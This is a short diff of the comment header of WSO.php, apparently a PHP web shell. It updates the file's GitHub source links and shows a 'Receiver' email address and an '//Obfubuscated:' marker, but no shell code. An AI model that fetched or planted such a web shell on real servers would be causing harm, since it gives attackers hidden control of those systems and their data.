@@ -1,7 +1,8 @@
 <?php
 /**
 * WSO.php
-* Source: https://raw.githubusercontent.com/wso-shell/WSO/master/WSO.php
+* Source: https://github.com/wso-shell/WSO/blob/master/WSO.php
+ *        https://github.com/wso-shell/PHP-SHELL-WSO/blob/master/WSO.php
 * Receiver: mail@mail.ua
 **/
 //Obfubuscated:
